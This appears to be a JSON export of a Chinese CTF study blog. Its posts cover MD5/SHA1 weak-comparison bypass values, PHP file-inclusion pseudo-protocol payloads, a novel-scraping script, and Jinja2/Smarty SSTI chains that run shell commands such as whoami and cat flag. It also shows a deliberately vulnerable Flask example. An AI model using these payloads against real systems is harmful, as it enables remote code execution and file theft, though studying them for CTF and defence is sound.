00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 sha1绕过弱比较同理 $a sha1($a) 10932435112 0e07766915004133176347055865026311692244 aaroZmOk 0e66507019969427134894567494305185566735 aaK1STfY 0e76658526655756207688271159624026011393 aaO8zKZF 0e89257456677279068558073954252716165668 aa3OFF9m 0e36977786278517984959260394024281014729 0e1290633704 0e19985187802402577070739524195726831799 感谢MD5&amp;sha1绕过","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"md5","slug":"md5","permalink":"http://example.com/tags/md5/"},{"name":"sql","slug":"sql","permalink":"http://example.com/tags/sql/"}],"author":"arkcimi"},{"title":"php伪协议","slug":"php伪协议","date":"2023-12-18T06:54:07.000Z","updated":"2024-03-13T15:18:38.478Z","comments":true,"path":"php伪协议/","link":"","permalink":"http://example.com/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"函数先看一些函数 include() | require()- index.php 1234567&lt;?php highlight_file(__FILE__); $file=$_GET[&#x27;file&#x27;]; include($file); echo($flag);?&gt; flag.php 123&lt;?php $flag=&quot;flag&#123;success&#125;&quot;?&gt; Notice: Undefined variable: flag 传参 ```?file=flag.php``` 这个时候 **flag&#123;success&#125;** 通过 include 或 require 函数，可以将 PHP 文件的内容插入另一个 PHP 文件 (在服务器执行它之前) 若文件不存在, include 只会警告 然后执行后边的正常语句 但 require 会直接报错然后跳出函数 include_once() | require_once()如果该文件中的代码已经被包含了，则不会再次包含，只会包含一次。include_once(require_once)需要查询一遍已加载的文件列表, 确认是否存在, 然后再加载 PHP伪协议1234567891011121 file:// — 访问本地文件系统2 http:// — 访问 HTTP(s) 网址3 ftp:// — 访问 FTP(s) URLs4 php:// — 访问各个输入/输出流(I/O streams)5 zlib:// — 压缩流6 data:// — 数据(RFC 2397)7 glob:// — 查找匹配的文件路径模式8 phar:// — PHP 归档9 ssh2:// — Secure Shell 210 rar:// — RAR11 ogg:// — 音频流12 expect:// — 处理交互式的流 常用的 协议 allow_url_fopen allow_url_include how to use . file:&#x2F;&#x2F; - - ?file&#x3D;file:&#x2F;&#x2F;**.txt php:&#x2F;&#x2F;filter - - ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;** php:&#x2F;&#x2F;input - on ?file&#x3D;php:&#x2F;&#x2F;input [POST DATA] zip:&#x2F;&#x2F; - - ?file&#x3D;zip:&#x2F;&#x2F;**.zip%23phpcode.txt data:&#x2F;&#x2F; on on ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain, 同上例子 但是 若没有echo 这时输入 ?file=php://filter/read=convert.base64-encode/resource=flag.php 得到 PD9waHAKICAgICRmbGFnPSJmbGFne3N1Y2Nlc3N9Igo&#x2F;Pg&#x3D;&#x3D; 用base64解码得到 123&lt;?php $flag=&quot;flag&#123;success&#125;&quot;?&gt; 使用文件包含函数包含文件时,文件中的代码会被执行 如果想要读取文件源码,可以使用base64对文件内容进行编码,编码后的文件内容不会被执行,而是展示在页面中 我们将页面中的内容使用base64解码,就可以获取文件的源码了 examplePHP的伪协议提供了一种简便的方式来访问各种资源，包括文件、网络资源和特殊流。下面是一些常见的PHP伪协议及其用法： file:&#x2F;&#x2F;: 用于访问本地文件系统中的文件。 1$content = file_get_contents(&#x27;file:///path/to/file.txt&#x27;); http:&#x2F;&#x2F; 和 https:&#x2F;&#x2F;: 用于通过 HTTP 或 HTTPS 协议访问远程资源。 1$content = file_get_contents(&#x27;http://example.com/data.json&#x27;); ftp:&#x2F;&#x2F;: 用于访问远程 FTP 服务器上的文件。 1$content = file_get_contents(&#x27;ftp://username:password@ftp.example.com/path/to/file.txt&#x27;); data:&#x2F;&#x2F;: 用于直接将数据嵌入到 PHP 脚本中，而不是从外部文件加载。 123$data = &#x27;Hello, world!&#x27;;$encoded = base64_encode($data);$content = file_get_contents(&#x27;data://text/plain;base64,&#x27; . $encoded); php:&#x2F;&#x2F;: 提供对 PHP 的各种输入&#x2F;输出流的访问。 12345// 读取标准输入$input = file_get_contents(&#x27;php://stdin&#x27;);// 写入到标准输出file_put_contents(&#x27;php://stdout&#x27;, &#x27;Hello, world!&#x27;); zip:&#x2F;&#x2F;: 用于访问 ZIP 文件中的文件。 1$content = file_get_contents(&#x27;zip://path/to/archive.zip#file.txt&#x27;); phar:&#x2F;&#x2F;: 用于访问 PHAR (PHP 归档) 文件中的文件。 1$content = file_get_contents(&#x27;phar://path/to/archive.phar/file.txt&#x27;); glob:&#x2F;&#x2F;: 用于获取符合指定模式的文件路径列表。 123foreach (glob(&#x27;glob://path/to/directory/*.txt&#x27;) as $file) &#123; echo &quot;$file\\n&quot;;&#125; expect:&#x2F;&#x2F;: 用于与 expect (交互式命令行工具) 集成。 1$output = file_get_contents(&#x27;expect://ls&#x27;); 这些是一些常见的PHP伪协议及其用法。使用这些伪协议，可以方便地访问各种资源，而不需要复杂的处理和配置。 T11file_get_contents($_GET[&#x27;a&#x27;]) = &quot;I want flag&quot; ?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I%20want%20flag ?a&#x3D;php:&#x2F;&#x2F;input POST部分： I want flag T2?file=php://filter/read=convert.base64-encode/resource=flag.php 经典查看flag.php后 编码内容让去看看flag ?file=php://filter/write=string.rot13/resource=flag T3read&#x3D;convert.iconv.utf-8.utf-16","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"php伪协议","slug":"php伪协议","permalink":"http://example.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"include","slug":"include","permalink":"http://example.com/tags/include/"}],"author":"arkcimi"},{"title":"Python","slug":"Python","date":"2023-12-07T15:05:36.000Z","updated":"2024-05-21T01:54:42.847Z","comments":true,"path":"Python/","link":"","permalink":"http://example.com/Python/","excerpt":"","text":"Python数组(补一下python的知识) tuple 1(a, b, c......) list 1[a, b, c......] dict 1&#123;a:aa, b:bb, c:cc......&#125; str123456&quot;\\&quot;\\&quot;&quot; # =&gt; &quot;&quot;&quot;\\\\\\\\&quot; # =&gt; \\\\&quot;&#123;&#123;&#123;&#125;&#125;&#125;&quot; # =&gt; &#123;&#123;&#123;&#125;&#125;&#125;&quot;&#123;&#123;&#123;&#125;&#125;&#125;&quot;.format(2) # =&gt; &#123;2&#125;&quot;&#123;&#123;&#125;&#125;&quot;.format(2) # =&gt; &#123;&#125;&quot;&#123;&#125;&quot;.format(2) # =&gt; 2 osos 1import os 可以运行系统命令 1234567&gt;&gt;&gt; print(os.popen(&#x27;ls /&#x27;).read())binbootdev......www_30765www_9050 12345678&gt;&gt;&gt; os.getcwd() # 获取当前工作路径&#x27;/home/arkcimi&#x27;&gt;&gt;&gt; os.getlogin() # 获取登录信息&#x27;arkcimi&#x27;&gt;&gt;&gt; os.name&#x27;posix&#x27;&gt;&gt;&gt; os.environ&#123;环境变量&#125; 爬虫随便找个小说试一下 剑来 用burp抓包 章节目录 123456789101112131415161718192021GET /38_38964/20392684.html HTTP/2Host: www.biqukan8.ccCookie: __51cke__=; bcolor=; font=; size=; fontcolor=; width=; __tins__21819133=%7B%22sid%22%3A%201701961220502%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201701963144795%7D; __51laig__=3Cache-Control: max-age=0Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Linux&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brAccept-Language: en-US,en;q=0.9If-None-Match: &quot;1701957784_br&quot;If-Modified-Since: Thu, 07 Dec 2023 14:03:04 GMTPriority: u=0, i python中的 requests 库可以发送requests请求 123456789101112131415161718import requestsheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;, &#x27;Cookie&#x27;: &#x27;__51cke__=; bcolor=; font=; size=; fontcolor=; width=; __tins__21819133=%7B%22sid%22%3A%201701961220502%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201701963144795%7D; __51laig__=3&#x27;, &#x27;Host&#x27;: &#x27;www.biqukan8.cc&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;&#125; # Cookie一般是用来认证身份main_url = &quot;https://www.biqukan8.cc/38_38964/20392684.html&quot;main_resp = requests.get(main_url, headers=headers) # 用get发送请求main_text = main_resp.textprint(main_text) 执行命令 1python [filename].py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;script&gt;login();&lt;/script&gt; &lt;div class=&quot;header&quot;&gt; &lt;div class=&quot;wrap&quot;&gt; &lt;div class=&quot;logo&quot;&gt; &lt;a href=&quot;/&quot; title=&quot;笔趣阁&quot;&gt;笔趣阁&lt;em&gt;www.biqukan8.cc&lt;/em&gt;&lt;/a&gt; &lt;/div&gt; &lt;script&gt;search();&lt;/script&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;nav&quot;&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;/&quot;&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;/modules/article/bookcase.php&quot;&gt;我的书架&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script&gt;list1();&lt;/script&gt; &lt;div class=&quot;book&quot;&gt; &lt;div class=&quot;info&quot;&gt; &lt;h2&gt;剑来&lt;/h2&gt; &lt;/div&gt; &lt;script&gt;app2();&lt;/script&gt; &lt;/div&gt; &lt;script&gt;list2();&lt;/script&gt; &lt;div class=&quot;listmain&quot;&gt; &lt;dl&gt; &lt;dt&gt;《剑来》最新章节列表&lt;/dt&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/51894719.html&quot;&gt;第一千一百四十章 这天公&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/51951192.html&quot;&gt;第一千一百三十九章 故事是一把双刃剑&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52004020.html&quot;&gt;第一千一百三十八章 蜉蝣见青天&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52014535.html&quot;&gt;第一千一百三十七章 如书如句读&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52076294.html&quot;&gt;第一千一百三十六章 人各梦魂中&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52108078.html&quot;&gt;第一千一百三十五章 再见陈平安&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52141526.html&quot;&gt;第一千一百三十四章 都曾少年游&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52280452.html&quot;&gt;第一千一百三十三章 道上青天&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52317327.html&quot;&gt;第一千一百三十二章 为何就山，可问春风&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52337099.html&quot;&gt;第一千一百三十一章 三三得几&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52349174.html&quot;&gt;第一千一百三十章 有个不用回答的问题&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52415193.html&quot;&gt;第一千一百二十九章 今宵明月&lt;/a&gt;&lt;/dd&gt; &lt;dt&gt;《剑来》正文卷&lt;/dt&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/38859339.html&quot;&gt;第一章 惊蛰&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/38850178.html&quot;&gt;第二章 开门&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/38844368.html&quot;&gt;第三章 日出&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/38836882.html&quot;&gt;第四章 黄鸟&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/38828993.html&quot;&gt;第五章 道破&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/38807567.html&quot;&gt;第六章 下签&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/38799247.html&quot;&gt;第七章 碗水&lt;/a&gt;&lt;/dd&gt; ......&lt;!--此处省略 --&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52108078.html&quot;&gt;第一千一百三十五章 再见陈平安&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52076294.html&quot;&gt;第一千一百三十六章 人各梦魂中&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52014535.html&quot;&gt;第一千一百三十七章 如书如句读&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/52004020.html&quot;&gt;第一千一百三十八章 蜉蝣见青天&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/51951192.html&quot;&gt;第一千一百三十九章 故事是一把双刃剑&lt;/a&gt;&lt;/dd&gt; &lt;dd&gt;&lt;a href =&quot;/38_38964/51894719.html&quot;&gt;第一千一百四十章 这天公&lt;/a&gt;&lt;/dd&gt; &lt;/dl&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 然后用 lxml 读取我们需要的信息 在浏览器f12中右键一个元素可以查看它的x地址 先看看第一章的request 12345678910111213141516171819GET /38_38964/38859339.html HTTP/2Host: www.biqukan8.ccCookie: __tins__21819133=%7B%22sid%22%3A%201701961220502%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201701963020502%7D; __51cke__=; __51laig__=1Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Linux&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: https://www.biqukan8.cc/38_38964/20392684.htmlAccept-Encoding: gzip, deflate, brAccept-Language: en-US,en;q=0.9Priority: u=0, i 很明显, 只需修改get后面的地址 我们要获取每一个章节名和地址 先拿第一章试试 1234567891011121314151617181920212223242526import requestsfrom lxml import etreeheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;, &#x27;Cookie&#x27;: &#x27;__51cke__=; bcolor=; font=; size=; fontcolor=; width=; __tins__21819133=%7B%22sid%22%3A%201701961220502%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201701963144795%7D; __51laig__=3&#x27;, &#x27;Host&#x27;: &#x27;www.biqukan8.cc&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;&#125;main_url = &quot;https://www.biqukan8.cc/38_38964/20392684.html&quot;main_resp = requests.get(main_url, headers=headers)main_text = main_resp.text# print(main_text) # 以上是不变的main_html = etree.HTML(main_text)url = main_html.xpath(&quot;/html/body/div[4]/dl/dd[13]/a/@href&quot;)[0] #得到一个数组, 取第一个值title = main_html.xpath(&quot;/html/body/div[4]/dl/dd[13]/a/text()&quot;)[0] print(url)print(title) 12/38_38964/38859339.html第一章 惊蛰 读取全部目录及地址 123456789101112131415161718192021222324252627import requestsfrom lxml import etreeheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;, &#x27;Cookie&#x27;: &#x27;__51cke__=; bcolor=; font=; size=; fontcolor=; width=; __tins__21819133=%7B%22sid%22%3A%201701961220502%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201701963144795%7D; __51laig__=3&#x27;, &#x27;Host&#x27;: &#x27;www.biqukan8.cc&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;&#125;main_url = &quot;https://www.biqukan8.cc/38_38964/20392684.html&quot;main_resp = requests.get(main_url, headers=headers)main_text = main_resp.text# print(main_text) # 以上是不变的main_html = etree.HTML(main_text)url=[]title=[]for i in range(13, 1160): url.append(main_html.xpath(&#x27;/html/body/div[4]/dl/dd[&#123;&#125;]/a/@href&#x27;.format(i))[0]) title.append(main_html.xpath(&quot;/html/body/div[4]/dl/dd[&#123;&#125;]/a/text()&quot;.format(i))[0])print(url)print(title) 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsfrom lxml import etreeheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&#x27;, &#x27;Cookie&#x27;: &#x27;__51cke__=; bcolor=; font=; size=; fontcolor=; width=; __tins__21819133=%7B%22sid%22%3A%201701961220502%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201701963144795%7D; __51laig__=3&#x27;, &#x27;Host&#x27;: &#x27;www.biqukan8.cc&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;&#125;main_url = &quot;https://www.biqukan8.cc/38_38964/20392684.html&quot;main_resp = requests.get(main_url, headers=headers)main_text = main_resp.text# print(main_text) # 以上是不变的main_html = etree.HTML(main_text)url=[]title=[]for i in range(13, 1160): url.append(main_html.xpath(&#x27;/html/body/div[4]/dl/dd[&#123;&#125;]/a/@href&#x27;.format(i))[0]) title.append(main_html.xpath(&quot;/html/body/div[4]/dl/dd[&#123;&#125;]/a/text()&quot;.format(i))[0])orurl = &quot;https://www.biqukan8.cc&quot;for i in range(1147): iresp = etree.HTML(requests.get(orurl+url[i], headers=headers).text) cont = iresp.xpath(&#x27;//*[@id=&quot;content&quot;]/text()&#x27;) s = &quot;\\n&quot;+title[i]+&quot;\\n&quot; for para in cont: s=s+para+&quot;\\n&quot; print(&quot;finish&#123;&#125;&quot;.format(i)) s=s+&quot;\\n&quot; with open(&quot;剑来.txt&quot;,&quot;a&quot;) as f: # python的文件操作 f.write(s) 好吧, 爬了10章网站就上不去了 后面查了一下, 爬太快可能会把服务器爆掉 12import time time.sleep(1) 每个循环加一个timesleep 成功!!! SSTISSTI就是 服务器端模板注入(Server-Side Template Injection) class-bases-subclasses chain class变量所属的类 123456789101112&gt;&gt;&gt; &#x27;&#x27;.__class__&lt;class &#x27;str&#x27;&gt;&gt;&gt;&gt; ().__class__&lt;class &#x27;tuple&#x27;&gt;&gt;&gt;&gt; [].__class__&lt;class &#x27;list&#x27;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;class &#x27;dict&#x27;&gt; bases(类的基类,) 123456789101112&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__(&lt;class &#x27;object&#x27;&gt;,)&gt;&gt;&gt; ().__class__.__bases__(&lt;class &#x27;object&#x27;&gt;,)&gt;&gt;&gt; [].__class__.__bases__(&lt;class &#x27;object&#x27;&gt;,)&gt;&gt;&gt; &#123;&#125;.__class__.__bases__(&lt;class &#x27;object&#x27;&gt;,) 返回的是一个tuple 加上[0] 12&gt;&gt;&gt; &#123;&#125;.__class__.__bases__[0]&lt;class &#x27;object&#x27;&gt; mro(类, 基类) 12&gt;&gt;&gt; &#123;&#125;.__class__.__mro__(&lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;) subclasses() 返回[子类a, 子类b, ……] 12&gt;&gt;&gt; &#123;&#125;.__class__.__bases__[0].__subclasses__()[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, ......&lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;rlcompleter.Completer&#x27;&gt;] 常用的子类 每一个python的好像不一样, 我的是140 12&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[140]&lt;class &#x27;os._wrap_close&#x27;&gt; init 12&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[140].__init__&lt;function _wrap_close.__init__ at 0x7f065040aca0&gt; globals 12&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__subclasses__()[140].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#x27;bin\\nboot\\ndev\\netc\\nflag\\nhome\\ninitrd.img\\ninitrd.img.old\\nlib\\nlib32\\nlib64\\nlost+found\\nmedia\\nmnt\\nopt\\nproc\\nroot\\nrun\\nsbin\\nsnap\\nsrv\\nsys\\ntmp\\nusr\\nvar\\nvmlinuz\\nvmlinuz.old\\nwww\\nwww_11903\\nwww_30765\\nwww_9050\\n&#x27; 转行符没有编码 import import 12&gt;&gt;&gt; __import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&#x27;bin\\nboot\\ndev\\netc\\nflag\\nhome\\ninitrd.img\\ninitrd.img.old\\nlib\\nlib32\\nlib64\\nlost+found\\nmedia\\nmnt\\nopt\\nproc\\nroot\\nrun\\nsbin\\nsnap\\nsrv\\nsys\\ntmp\\nusr\\nvar\\nvmlinuz\\nvmlinuz.old\\nwww\\nwww_11903\\nwww_30765\\nwww_9050\\n&#x27; catch warning1&#123;&#123;().__class__.__bases__[0].__subclasses__()[147].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)&#125;&#125; 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; T112&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat flag&#x27;).read()&#125;&#125;&#123;&#123;lipsum.__globals__.get(&quot;os&quot;).popen(&quot;tac f*&quot;).read()&#125;&#125; T2 Smarty{if system(‘ls &#x2F;‘)}{&#x2F;if}{if system(‘cat &#x2F;flag_13_searchmaster’)}{&#x2F;if} dict()|join12345678(% set+args=dict(ar=0,gs=1)|join %)&#123;% set aa=dict(pop=0,en=1)|join %&#125;&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[161].__init__.__globals__[aa](&#x27;whoami&#x27;).read()&#125;&#125;&#123;%(lipsum|attr(__globals__))|attr(get)(os)|attr(popen)(cmd)|attr(read)()%&#125;&#123;&#123;&#x27;&#x27;[request[&#x27;args&#x27;][&#x27;t1&#x27;]]&#125;&#125;&amp;t1=__class__&#123;%set ar=dict(ar=a, gs=b)|join%&#125;&#123;%set ge=dict(g=a, et=b)|join%&#125;&#123;%set a=dict(a=a)|join%&#125;&#123;%print request|attr(ar)|attr(ge)(a)%&#125;&amp;a=qwq attr(“globals”)[‘’]globals[‘os’] 1&#123;% %&#125;里面相当于写py builtins1&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[161].__init__.__globals__.get(&#x27;__builtins__&#x27;).get(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125; filter原来这些 叫过滤器：**|filter()** 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354attr() #获取属性join() #合并成字符串FILTERS = &#123; &#x27;abs&#x27;: abs, &#x27;attr&#x27;: do_attr, &#x27;batch&#x27;: do_batch, &#x27;capitalize&#x27;: do_capitalize, &#x27;center&#x27;: do_center, &#x27;count&#x27;: len, &#x27;d&#x27;: do_default, &#x27;default&#x27;: do_default, &#x27;dictsort&#x27;: do_dictsort, &#x27;e&#x27;: escape, &#x27;escape&#x27;: escape, &#x27;filesizeformat&#x27;: do_filesizeformat, &#x27;first&#x27;: do_first, &#x27;float&#x27;: do_float, &#x27;forceescape&#x27;: do_forceescape, &#x27;format&#x27;: do_format, &#x27;groupby&#x27;: do_groupby, &#x27;indent&#x27;: do_indent, &#x27;int&#x27;: do_int, &#x27;join&#x27;: do_join, &#x27;last&#x27;: do_last, &#x27;length&#x27;: len, &#x27;list&#x27;: do_list, &#x27;lower&#x27;: do_lower, &#x27;map&#x27;: do_map, &#x27;pprint&#x27;: do_pprint, &#x27;random&#x27;: do_random, &#x27;reject&#x27;: do_reject, &#x27;rejectattr&#x27;: do_rejectattr, &#x27;replace&#x27;: do_replace, &#x27;reverse&#x27;: do_reverse, &#x27;round&#x27;: do_round, &#x27;safe&#x27;: do_mark_safe, &#x27;select&#x27;: do_select, &#x27;selectattr&#x27;: do_selectattr, &#x27;slice&#x27;: do_slice, &#x27;sort&#x27;: do_sort, &#x27;string&#x27;: soft_unicode, &#x27;striptags&#x27;: do_striptags, &#x27;sum&#x27;: do_sum, &#x27;title&#x27;: do_title, &#x27;trim&#x27;: do_trim, &#x27;truncate&#x27;: do_truncate, &#x27;upper&#x27;: do_upper, &#x27;urlencode&#x27;: do_urlencode, &#x27;urlize&#x27;: do_urlize, &#x27;wordcount&#x27;: do_wordcount, &#x27;wordwrap&#x27;: do_wordwrap, &#x27;xmlattr&#x27;: do_xmlattr, &#x27;tojson&#x27;: do_tojson,&#125; flask经典jinjia2漏洞ssti先看看 render_template app.py 123456789101112131415from flask import ( Flask, request, render_template,)app = Flask(__name__)@app.route(&quot;/&quot;,methods=[&quot;GET&quot;, &quot;POST&quot;])def index(): if request.method == &quot;GET&quot;: name = request.args.get(&quot;name&quot;) return render_template(&quot;index&quot;)if __name__ == &quot;__main__&quot;: app.run(&quot;0.0.0.0&quot;, 5000) app&#x2F;templates&#x2F;index.html 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;apptest&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello World!&lt;/h1&gt; &lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 1jinjia2会解析 **&#123;&#123;&#125;&#125;** 里面的变量 现在看看 render_template_string 123456789101112131415from flask import ( Flask, request, render_template_string,)app = Flask(__name__)@app.route(&quot;/&quot;,methods=[&quot;GET&quot;, &quot;POST&quot;])def index(): if request.method == &quot;GET&quot;: name = request.args.get(&quot;name&quot;) return render_template_string(&quot;&lt;h1&gt;%s&lt;/h1&gt;&quot; % name)if __name__ == &quot;__main__&quot;: app.run(&quot;0.0.0.0&quot;, 5000) 1如此在 **name** 中添加&#123;&#123;&#125;&#125; 就会造成ssti漏洞 argparseargparse 这个博主讲的不错 1234567891011121314import argparse aap = argparse.ArgumentParser(description = &quot;parse arguement of XXXX&quot;)aap.add_argument(&#x27;-i&#x27;, &#x27;--input&#x27;, 